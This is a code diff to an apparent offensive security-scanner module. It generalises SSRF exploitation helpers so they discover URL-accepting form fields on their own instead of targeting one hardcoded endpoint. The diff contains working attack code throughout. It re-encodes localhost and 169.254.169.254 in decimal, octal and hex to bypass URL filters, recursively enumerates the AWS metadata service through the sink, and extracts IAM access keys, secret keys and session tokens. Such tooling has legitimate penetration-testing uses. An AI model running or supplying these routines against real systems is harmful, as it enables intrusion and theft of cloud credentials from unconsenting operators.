@@ -1300,120 +1300,214 @@ def generate_ssrf_bypass_ips(ip: str = "127.0.0.1") -> list[str]:
     return bypasses
 
 
+# Canonical AWS metadata service IP — universal, not target-specific. Encodings
+# are derived generically (decimal/octal/hex) rather than hardcoding a magic int.
+AWS_METADATA_IP = "169.254.169.254"
+
+# Generic SSRF URL-filter markers and URL-accepting parameter-name hints. These
+# describe the vulnerability class, not any one target.
+_SSRF_BLOCK_MARKERS = (
+    "security policy",
+    "blocked",
+    "forbidden",
+    "not allowed",
+    "denied",
+    "internal resource",
+)
+_URL_PARAM_HINTS = (
+    "url",
+    "uri",
+    "link",
+    "fetch",
+    "src",
+    "source",
+    "target",
+    "dest",
+    "destination",
+    "host",
+    "path",
+    "callback",
+    "redirect",
+    "proxy",
+    "feed",
+    "image",
+    "load",
+)
+
+
+def find_ssrf_endpoints(
+    scanner: SecurityScanner, start_paths: list[str] | None = None
+) -> list[dict[str, str]]:
+    """Discover candidate SSRF sinks by mapping the surface (no assumptions).
+
+    Returns ``[{"url", "method", "param"}]`` for every form input that looks
+    like it accepts a URL (``type=url`` or a URL-ish parameter name). This is
+    how the AWS/SSRF helpers locate their sink instead of hardcoding one.
+    """
+    found: list[dict[str, str]] = []
+    seen: set[tuple[str, str, str]] = set()
+    for path in start_paths or ["/"]:
+        surface = scanner.attack_surface.get(path) or scanner.map_surface(path)
+        for form in surface.get("forms", []):
+            action = form.get("action") or urljoin(scanner.base_url, path)
+            method = (form.get("method") or "GET").upper()
+            for inp in form.get("inputs", []):
+                name = inp.get("name") or ""
+                itype = inp.get("type") or ""
+                if itype == "url" or any(h in name.lower() for h in _URL_PARAM_HINTS):
+                    key = (action, method, name)
+                    if key not in seen:
+                        seen.add(key)
+                        found.append({"url": action, "method": method, "param": name})
+    return found
+
+
+def _resolve_ssrf_sink(
+    scanner: SecurityScanner, ssrf_endpoint: str | None, ssrf_param: str | None
+) -> tuple[str | None, str]:
+    """Return (endpoint, param), discovering them from the surface if not given."""
+    if ssrf_endpoint:
+        return ssrf_endpoint, ssrf_param or "url"
+    candidates = find_ssrf_endpoints(scanner)
+    if candidates:
+        return candidates[0]["url"], ssrf_param or candidates[0]["param"]
+    return None, ssrf_param or "url"
+
+
+def _ssrf_fetch(
+    scanner: SecurityScanner,
+    ssrf_endpoint: str,
+    ssrf_param: str,
+    target_url: str,
+    *,
+    url_suffix: str = "",
+    method: str = "POST",
+) -> requests.Response:
+    """Send one SSRF request: deliver ``target_url`` (+optional suffix) via the sink."""
+    data = {ssrf_param: target_url + url_suffix}
+    if method.upper() in ("POST", "PUT", "PATCH"):
+        return scanner._make_request(method, ssrf_endpoint, data=data)
+    return scanner._make_request(method, ssrf_endpoint, params=data)
+
+
+def _ssrf_body(text: str) -> str:
+    """Best-effort extraction of the fetched content from an SSRF response.
+
+    Prefers a ``<pre>`` block (common for preview/echo sinks); otherwise returns
+    the response text. HTML entities are unescaped. No target-specific markers.
+    """
+    match = re.search(r"<pre[^>]*>(.*?)</pre>", text, re.DOTALL | re.IGNORECASE)
+    raw = match.group(1) if match else text
+    for a, b in (("&lt;", "<"), ("&gt;", ">"), ("&amp;", "&"), ("&#34;", '"'), ("&#39;", "'")):
+        raw = raw.replace(a, b)
+    return raw
+
+
+def _ssrf_blocked(text: str) -> bool:
+    low = text.lower()
+    return any(marker in low for marker in _SSRF_BLOCK_MARKERS)
+
+
 def bypass_url_filter(
     url: str,
     scanner: SecurityScanner,
+    *,
+    ssrf_endpoint: str | None = None,
+    ssrf_param: str | None = None,
+    url_suffix: str = "",
     blocked_substrings: list[str] | None = None,
 ) -> str | None:
-    """Try to bypass SSRF URL filters by manipulating the URL.
+    """Try to bypass an SSRF URL filter by re-encoding the host.
 
-    Tries:
-    1. IP encoding bypasses (octal, decimal, hex) for localhost
-    2. #.yaml fragment trick for extension requirements
-    3. Query string splitting for blocked path substrings
+    Generic: the SSRF sink is discovered (or passed via ``ssrf_endpoint``),
+    ``url_suffix`` is supplied by the caller only if the target's filter needs
+    one (e.g. an extension requirement) — nothing is assumed about the target.
 
-    Returns the first working URL that passes the filter, or None.
+    Returns the first URL that the sink fetches without a block, or None.
     """
     if blocked_substrings is None:
-        blocked_substrings = ["127.0.0.1", "localhost", "internal", "metadata", "nimbus"]
+        blocked_substrings = ["127.0.0.1", "localhost", "internal", "metadata"]
+
+    endpoint, param = _resolve_ssrf_sink(scanner, ssrf_endpoint, ssrf_param)
+    if not endpoint:
+        return None
 
     parsed = urlparse(url)
-
     bypass_ips = generate_ssrf_bypass_ips("127.0.0.1")
-    bypass_ips.extend(generate_ssrf_bypass_ips("169.254.169.254"))
+    bypass_ips.extend(generate_ssrf_bypass_ips(AWS_METADATA_IP))
 
     for bypass_ip in bypass_ips:
         if bypass_ip in blocked_substrings:
             continue
         test_url = url.replace(parsed.hostname or "", bypass_ip)
-        if not any(bs in test_url.lower() for bs in blocked_substrings):
-            if "#" not in test_url:
-                test_url += "#.yaml"
-            r = scanner._make_request(
-                "POST",
-                f"{scanner.base_url}/jobs/preview",
-                data={"url": test_url},
+        if any(bs in test_url.lower() for bs in blocked_substrings):
+            continue
+        r = _ssrf_fetch(scanner, endpoint, param, test_url, url_suffix=url_suffix)
+        if not _ssrf_blocked(r.text):
+            scanner._record_finding(
+                endpoint=endpoint,
+                method="POST",
+                payload=test_url + url_suffix,
+                indicators=["ssrf", "filter_bypass"],
+                details=[f"SSRF filter bypassed via {test_url}{url_suffix}"],
+                vuln_type="ssrf_filter_bypass",
+                source="bypass_url_filter",
             )
-            if "Security policy" not in r.text and "blocked" not in r.text.lower():
-                scanner._record_finding(
-                    endpoint=f"{scanner.base_url}/jobs/preview",
-                    method="POST",
-                    payload=test_url,
-                    indicators=["ssrf", "filter_bypass"],
-                    details=[f"SSRF filter bypassed via {test_url}"],
-                    vuln_type="ssrf_filter_bypass",
-                    source="bypass_url_filter",
-                )
-                return test_url
+            return test_url + url_suffix
 
     return None
 
 
 # ============================================================================
-# AWS Metadata Service Enumeration
+# AWS Metadata Service Enumeration (via a discovered SSRF sink)
 # ============================================================================
 
 
 def enumerate_aws_metadata(
     scanner: SecurityScanner,
-    metadata_ip: str = "2852039166",
+    *,
+    ssrf_endpoint: str | None = None,
+    ssrf_param: str | None = None,
+    url_suffix: str = "",
+    metadata_ip: str | None = None,
     base_path: str = "/latest/meta-data/",
     max_depth: int = 4,
 ) -> dict[str, str]:
-    """Recursively enumerate the AWS metadata service.
+    """Recursively enumerate the AWS metadata service through an SSRF sink.
 
-    Uses the SSRF scanner to fetch metadata paths and recursively
-    explore directories. The metadata_ip should be a bypass IP
-    (decimal 2852039166 works when 169.254.169.254 is filtered).
-
-    Returns a dict mapping path → content for all leaf nodes.
+    The sink is discovered from the surface (or passed in); ``metadata_ip``
+    defaults to a decimal-encoded ``169.254.169.254`` (a generic IP-filter
+    bypass), and ``url_suffix`` is only used if the caller found the filter
+    needs one. Returns a dict of metadata path → content.
     """
+    endpoint, param = _resolve_ssrf_sink(scanner, ssrf_endpoint, ssrf_param)
+    if not endpoint:
+        return {}
+    ip = metadata_ip or ip_to_decimal(AWS_METADATA_IP)
     results: dict[str, str] = {}
+
+    def fetch(path: str) -> str | None:
+        r = _ssrf_fetch(scanner, endpoint, param, f"http://{ip}{path}", url_suffix=url_suffix)
+        if _ssrf_blocked(r.text):
+            return None
+        content = _ssrf_body(r.text)
+        return None if ("Not Found" in content or "Could not fetch" in content) else content
 
     def _explore(path: str, depth: int) -> None:
         if depth > max_depth:
             return
-
-        url = f"http://{metadata_ip}{path}#.yaml"
-        r = scanner._make_request(
-            "POST",
-            f"{scanner.base_url}/jobs/preview",
-            data={"url": url},
-        )
-
-        content_match = re.search(r"<pre>(.*?)</pre>", r.text, re.DOTALL)
-        if not content_match:
+        content = fetch(path)
+        if content is None:
             return
-
-        content = content_match.group(1)
-        content = content.replace("&lt;", "<").replace("&gt;", ">")
-        content = content.replace("&amp;", "&").replace("&#34;", '"').replace("&#39;", "'")
-
-        if "Not Found" in content or "Could not fetch" in content:
-            return
-
         lines = [line.strip() for line in content.split("\n") if line.strip()]
-        if len(lines) > 1 and all(
-            not line.startswith("{") and not line.startswith("<") for line in lines
-        ):
+        if len(lines) > 1 and all(not ln.startswith(("{", "<")) for ln in lines):
             for line in lines:
                 if line.endswith("/"):
                     _explore(f"{path}{line}", depth + 1)
                 else:
-                    leaf_url = f"http://{metadata_ip}{path}{line}#.yaml"
-                    leaf_r = scanner._make_request(
-                        "POST",
-                        f"{scanner.base_url}/jobs/preview",
-                        data={"url": leaf_url},
-                    )
-                    leaf_match = re.search(r"<pre>(.*?)</pre>", leaf_r.text, re.DOTALL)
-                    if leaf_match:
-                        leaf_content = leaf_match.group(1)
-                        leaf_content = leaf_content.replace("&lt;", "<").replace("&gt;", ">")
-                        leaf_content = leaf_content.replace("&amp;", "&")
-                        leaf_content = leaf_content.replace("&#34;", '"').replace("&#39;", "'")
-                        if "Not Found" not in leaf_content:
-                            results[f"{path}{line}"] = leaf_content
+                    leaf = fetch(f"{path}{line}")
+                    if leaf is not None:
+                        results[f"{path}{line}"] = leaf
         else:
             results[path.rstrip("/")] = content
 
@@ -1421,9 +1515,9 @@ def enumerate_aws_metadata(
 
     if results:
         scanner._record_finding(
-            endpoint=f"{scanner.base_url}/jobs/preview",
+            endpoint=endpoint,
             method="POST",
-            payload=f"http://{metadata_ip}{base_path}#.yaml",
+            payload=f"http://{ip}{base_path}{url_suffix}",
             indicators=["ssrf", "aws_metadata"],
             details=[f"Enumerated {len(results)} metadata node(s) via SSRF"],
             vuln_type="ssrf_aws_metadata",
@@ -1434,55 +1528,50 @@ def enumerate_aws_metadata(
 
 def get_aws_credentials(
     scanner: SecurityScanner,
-    metadata_ip: str = "2852039166",
+    *,
+    ssrf_endpoint: str | None = None,
+    ssrf_param: str | None = None,
+    url_suffix: str = "",
+    metadata_ip: str | None = None,
     role_name: str | None = None,
 ) -> dict[str, str] | None:
-    """Get AWS IAM credentials from the metadata service.
+    """Get AWS IAM credentials from the metadata service via an SSRF sink.
 
-    If role_name is not provided, discovers available roles first.
-    Returns a dict with AccessKeyId, SecretAccessKey, Token, Expiration.
+    The sink is discovered (or passed in). If ``role_name`` is omitted, the
+    available role is discovered from the metadata service first. Returns a dict
+    with AccessKeyId, SecretAccessKey, Token, Expiration.
     """
+    endpoint, param = _resolve_ssrf_sink(scanner, ssrf_endpoint, ssrf_param)
+    if not endpoint:
+        return None
+    ip = metadata_ip or ip_to_decimal(AWS_METADATA_IP)
+    cred_base = f"http://{ip}/latest/meta-data/iam/security-credentials/"
+
     if role_name is None:
-        url = f"http://{metadata_ip}/latest/meta-data/iam/security-credentials/#.yaml"
-        r = scanner._make_request(
-            "POST",
-            f"{scanner.base_url}/jobs/preview",
-            data={"url": url},
-        )
-        content_match = re.search(r"<pre>(.*?)</pre>", r.text, re.DOTALL)
-        if not content_match:
+        r = _ssrf_fetch(scanner, endpoint, param, cred_base, url_suffix=url_suffix)
+        if _ssrf_blocked(r.text):
             return None
-        content = content_match.group(1).replace("&lt;", "<").replace("&gt;", ">")
-        content = content.replace("&amp;", "&").replace("&#34;", '"').replace("&#39;", "'")
-        roles = [r.strip() for r in content.split("\n") if r.strip() and "Not Found" not in r]
+        content = _ssrf_body(r.text)
+        roles = [ln.strip() for ln in content.split("\n") if ln.strip() and "Not Found" not in ln]
         if not roles:
             return None
         role_name = roles[0]
 
-    url = f"http://{metadata_ip}/latest/meta-data/iam/security-credentials/{role_name}#.yaml"
-    r = scanner._make_request(
-        "POST",
-        f"{scanner.base_url}/jobs/preview",
-        data={"url": url},
-    )
-    content_match = re.search(r"<pre>(.*?)</pre>", r.text, re.DOTALL)
-    if not content_match:
+    target = f"{cred_base}{role_name}"
+    r = _ssrf_fetch(scanner, endpoint, param, target, url_suffix=url_suffix)
+    if _ssrf_blocked(r.text):
         return None
-    content = content_match.group(1).replace("&lt;", "<").replace("&gt;", ">")
-    content = content.replace("&amp;", "&").replace("&#34;", '"').replace("&#39;", "'")
-
+    content = _ssrf_body(r.text)
     try:
         creds: dict[str, str] = json.loads(content)
     except (json.JSONDecodeError, ValueError):
         return None
 
-    # Record the credential exposure so it lands in the findings DB / second
-    # brain (previously this high-value win was returned but never recorded).
     if creds.get("AccessKeyId"):
         scanner._record_finding(
-            endpoint=f"{scanner.base_url}/jobs/preview",
+            endpoint=endpoint,
             method="POST",
-            payload=url,
+            payload=target + url_suffix,
             indicators=["ssrf", "aws_credentials"],
             details=[f"IAM role {role_name}: AccessKeyId {creds.get('AccessKeyId')}"],
             vuln_type="ssrf_aws_credentials",
